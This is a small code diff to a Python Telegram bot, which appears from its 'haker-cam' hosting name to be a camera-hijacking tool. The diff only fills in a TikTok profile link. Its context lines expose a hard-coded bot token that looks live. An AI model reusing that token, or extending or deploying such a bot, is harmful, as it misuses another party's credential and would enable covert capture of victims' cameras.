@@ -12,7 +12,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply
 # 1. الإعدادات الأساسية
 BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
 RENDER_URL = "https://haker-cam.onrender.com" 
-TIKTOK_PROFILE = "https://www.tiktok.com/@your_username"  # 👈 ضع رابط حسابك التيك توك هنا
+TIKTOK_PROFILE = "https://www.tiktok.com/@hrb_o9?_r"  # 👈 ضع رابط حسابك التيك توك هنا
 
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = FastAPI()
